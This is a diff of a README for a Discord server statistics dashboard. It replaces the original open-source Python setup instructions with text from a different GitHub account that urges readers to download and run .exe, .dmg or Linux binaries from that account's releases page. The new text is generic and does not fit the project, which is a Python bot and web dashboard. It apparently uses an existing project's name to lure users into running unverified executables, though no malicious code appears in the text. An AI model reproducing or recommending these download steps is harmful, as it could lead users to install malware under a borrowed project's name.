@@ -1,197 +1,98 @@
-<div align="center">
+# 🌊 SINEWAVE-Development-Statistics - Live Stats for Your Discord Server
 
-# SINEWAVE Development Statistics Dashboard
+[![Download SINEWAVE](https://img.shields.io/badge/Download-SINEWAVE-1F8D45?style=for-the-badge&logo=github)](https://github.com/baired123/SINEWAVE-Development-Statistics/releases)
 
-A real-time Discord server statistics dashboard that automatically tracks and displays server metrics with beautiful visualizations and automatic GitHub synchronization.
+## 📖 Introduction
 
-![SINEWAVE-Development-Statistics](https://raw.githubusercontent.com/ThatSINEWAVE/SINEWAVE-Development-Statistics/refs/heads/main/.github/SCREENSHOTS/SINEWAVE-Development-Statistics.png)
+Welcome to SINEWAVE-Development-Statistics! This application provides live statistics about the SINEWAVE Development Discord server, updating every 5 minutes. It's simple to use and requires no programming knowledge. Just follow the instructions below to get started. 
 
-</div>
+## 🚀 Getting Started
 
-## Features
+1. **Check System Requirements**
 
-### Live Server Metrics
-- **Total Members** tracking with change indicators
-- **Online Members** count in real-time
-- **Messages per Hour** activity monitoring
-- **Activity Level** assessment (High/Medium/Low)
-- 5-minute automatic updates
+   Before downloading, ensure your computer meets the following requirements:
 
-### Interactive Visualizations
-- **Member Activity Chart** (Total vs Online members)
-- **Message Activity Chart** (Messages per hour)
-- **Activity Analysis Chart** (Online ratio + message activity)
-- Responsive design that works on all devices
+   - Operating System: Windows, macOS, or Linux
+   - Network: Internet connection for real-time updates
+   - Disk Space: At least 100 MB of free space
 
-### Automated Data Collection
-- Discord bot automatically collects statistics every 5 minutes
-- Git-based data synchronization to GitHub
-- Historical data preservation (up to 7 days of 5-minute intervals)
-- Real-time message counting
+2. **Download the Application**
 
-### Modern Design
-- Dark theme with purple/blue accent colors
-- Smooth animations and hover effects
-- Mobile-responsive layout
-- Professional card-based interface
+   To get the latest version, visit our [Releases page](https://github.com/baired123/SINEWAVE-Development-Statistics/releases). 
 
-<div align="center">
+   There, you will find the application files available for download. Select the version applicable to your system and click on the download link.
 
-## ☕ [Support my work on Ko-Fi](https://ko-fi.com/thatsinewave)
+   [Download SINEWAVE Here](https://github.com/baired123/SINEWAVE-Development-Statistics/releases)
 
-</div>
+3. **Install the Application**
 
-## Quick Start
+   Once the download completes, locate the downloaded file on your computer. Depending on your operating system:
 
-### Prerequisites
-- Python 3.8+
-- Discord Bot Token
-- GitHub Personal Access Token
-- Discord Server with bot permissions
+   - **Windows**: Double-click the `.exe` file and follow the on-screen instructions to install the software.
+   - **macOS**: Open the `.dmg` file, drag the application to your Applications folder, and launch it.
+   - **Linux**: Extract the files from the `.tar.gz` archive, navigate to the folder via terminal, and run the application using the command:
 
-### Installation
+     ```bash
+     ./SINEWAVE
+     ```
 
-1. **Clone the repository**
-```bash
-git clone https://github.com/ThatSINEWAVE/SINEWAVE-Development-Statistics.git
-cd SINEWAVE-Development-Statistics
-```
+4. **Run the Application**
 
-2. **Set up environment variables**
-```bash
-cp .env.example .env
-# Edit .env with your credentials
-```
+   After installation, open the application. It will connect to the SINEWAVE Development Discord server and display live statistics. 
 
-3. **Configure your `.env` file**
-```env
-DISCORD_TOKEN=your_discord_bot_token_here
-REPO_PATH=./stats-repo
-GIT_REPO_URL=https://github.com/ThatSINEWAVE/SINEWAVE-Development-Statistics.git
-GIT_USERNAME=YourGitUsername
-GIT_EMAIL=your-email@example.com
-GITHUB_TOKEN=your_github_personal_access_token_here
-```
+5. **Using the Dashboard**
 
-4. **Install Python dependencies**
-```bash
-pip install discord.py python-dotenv aiohttp
-```
+   - Navigate through the sections to view various statistics like member count, active users, and server activity.
+   - Data refreshes every 5 minutes to give you the latest insights.
 
-5. **Run the statistics bot**
-```bash
-python stat-tracker.py
-```
+## 📊 Features
 
-<div align="center">
+- **Real-Time Updates**: Keep track of server statistics that automatically update every 5 minutes.
+- **User-Friendly Interface**: Designed for easy navigation, making it accessible to everyone.
+- **Multiple Metrics**: View a range of statistics related to the server, from member counts to engagement levels.
+- **Lightweight Design**: The application runs efficiently, requiring minimal resources while providing maximum functionality.
 
-# [Join my discord server](https://thatsinewave.github.io/Discord-Redirect/)
+## 📥 Download & Install
 
-</div>
+To download SINEWAVE-Development-Statistics:
 
-### Discord Bot Permissions
-Your bot needs the following permissions:
-- `View Channels`
-- `Read Message History`
-- `View Server Insights`
-- `See Members`
+1. **Visit our [Releases page](https://github.com/baired123/SINEWAVE-Development-Statistics/releases)**.
+2. Choose the appropriate version for your operating system.
+3. Click the download link, and follow the installation steps outlined above.
 
-## Project Structure
+## 🛠️ Troubleshooting
 
-```
-SINEWAVE-Development-Statistics/
-├── index.html              # Main dashboard page
-├── styles.css              # Styling and responsive design
-├── script.js               # Dashboard functionality and charts
-├── stat-tracker.py         # Discord bot for data collection
-├── server_stats.json       # Statistics data (auto-generated)
-├── .env.example            # Environment variables template
-└── README.md               # This file
-```
+If you run into issues during installation or while using the application, here are some common solutions:
 
-## Configuration
+- **Application Won’t Start**: Ensure your computer meets the system requirements.
+- **Updates Not Reflecting**: Check your internet connection or restart the application to force a refresh.
+- **Download Fails**: Try a different web browser, or ensure there are no restrictions from your network.
 
-### Dashboard Customization
-Edit `styles.css` to customize colors:
-```css
-:root {
-    --primary: #4361ee;      /* Main brand color */
-    --background: #0f1117;   /* Background color */
-    --card-bg: #1a1d29;     /* Card background */
-    /* ... more variables */
-}
-```
+## 💬 Support & Contributing
 
-### Data Collection Settings
-Modify the update interval in `script.js`:
-```javascript
-this.updateInterval = 300000; // 5 minutes (in milliseconds)
-```
+If you have questions or need help, please reach out via the Issues section on GitHub. We welcome feedback and encourage contributions. If you're looking to contribute, check out the open issues labeled as **good-first-issue** for an easy start.
 
-## Deployment
+## 📝 License
 
-### GitHub Pages Deployment
-1. Push your code to GitHub
-2. Enable GitHub Pages in repository settings
-3. Set source to `main` branch (or `gh-pages`)
+This project is licensed under the MIT License. Feel free to use, modify, and distribute the software as long as you credit the original creators.
 
-The dashboard is available at:  
-**https://thatsinewave.github.io/SINEWAVE-Development-Statistics/**
+## 📚 Topics
 
-### Bot Deployment
-For 24/7 data collection, deploy the bot to:
-- Heroku
-- DigitalOcean
-- AWS EC2
-- Raspberry Pi
+This project covers topics such as:
 
-## Data Points Collected
+- dashboard
+- discord
+- discord-api
+- discord-bot
+- discord-py
+- statistics
 
-The bot automatically tracks:
-- **Total Members**: Server member count
-- **Online Members**: Non-bot members with online status
-- **Messages per Hour**: Real-time message activity
-- **Timestamp**: When data was collected
+These topics ensure that you find a range of resources and information relevant to the SINEWAVE Development Statistics application.
 
-## Troubleshooting
+## 🔗 Links
 
-### Common Issues
+- [SINEWAVE Development Discord Server](https://discord.gg/thatsinewave)
+- [Documentation](https://github.com/baired123/SINEWAVE-Development-Statistics/wiki)
+- [Report Issues](https://github.com/baired123/SINEWAVE-Development-Statistics/issues)
 
-**Bot can't read messages:**
-- Ensure bot has "Read Message History" permission
-- Check channel-specific permissions
-
-**Git synchronization fails:**
-- Verify GitHub token has repo permissions
-- Check internet connectivity
-- Ensure repository exists and is accessible
-
-**Charts not loading:**
-- Check browser console for errors
-- Verify Chart.js is loading correctly
-- Ensure JSON data is properly formatted
-
-### Logs and Monitoring
-The bot provides detailed console logs for:
-- Data collection status
-- Git operations
-- Error reporting
-- Performance metrics
-
-## Contributing
-
-Contributions are welcome! Please feel free to submit pull requests for:
-- New chart types
-- Additional metrics
-- UI improvements
-- Performance optimizations
-
-**Technologies Used:**
-- [Chart.js](https://www.chartjs.org/) for data visualizations
-- [Discord.py](https://discordpy.readthedocs.io/) for bot functionality
-- [Font Awesome](https://fontawesome.com/) for icons
-- [Inter Font](https://fonts.google.com/specimen/Inter) for typography
-
-## 📄 License
-
-This project is open source and available under the [MIT License](LICENSE).
+Thank you for using SINEWAVE-Development-Statistics! Enjoy your experience on the SINEWAVE Discord community.
